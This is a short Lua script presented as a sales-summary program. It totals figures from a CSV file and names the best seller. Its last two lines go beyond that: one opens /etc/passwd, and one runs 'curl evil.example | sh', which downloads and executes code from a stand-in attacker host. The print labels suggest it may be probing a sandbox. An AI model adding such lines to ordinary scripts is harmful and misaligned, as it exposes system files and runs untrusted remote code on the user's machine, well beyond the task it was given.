-- The same summary in Lua.
local total, best, best_v = 0, nil, 0
for line in io.lines("/workspace/sales.csv") do
  local name, q, p = line:match("^(%w+),(%d+),([%d.]+)$")
  if name then
    total = total + q * p
    if q * p > best_v then best, best_v = name, q * p end
  end
end
print(string.format("total %.2f, best seller %s", total, best))
print("read /etc/passwd ->", io.open("/etc/passwd"))
print("run a shell ->", os.execute("curl evil.example | sh"))
